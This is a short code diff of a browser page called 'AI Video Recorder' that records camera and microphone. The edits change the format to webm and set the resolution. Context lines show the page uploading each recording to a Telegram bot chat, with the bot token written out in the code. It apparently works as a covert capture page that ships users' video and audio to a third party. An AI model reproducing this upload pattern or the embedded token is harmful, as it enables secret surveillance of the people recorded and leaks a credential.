@@ -71,7 +71,7 @@
     <div class="footer">© 2025 AI Video Recorder</div>
 
     <script>
-        let useRearCamera = false; // Default to front camera
+        let useRearCamera = false;
         let mediaRecorder;
         let stream;
         const chunks = [];
@@ -80,7 +80,11 @@
         async function startStream() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: useRearCamera ? 'environment' : 'user' },
+                    video: { 
+                        facingMode: useRearCamera ? 'environment' : 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
                     audio: true
                 });
                 document.getElementById('livePreview').srcObject = stream;
@@ -98,7 +102,7 @@
             };
 
             mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 document.getElementById('videoPlayer').src = URL.createObjectURL(blob);
                 document.getElementById('videoPlayer').load();
                 document.getElementById('videoPlayer').play();
@@ -134,7 +138,7 @@
             const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', blob, 'video.mp4');
+            formData.append('video', blob, 'video.webm');
 
             fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                 method: 'POST',
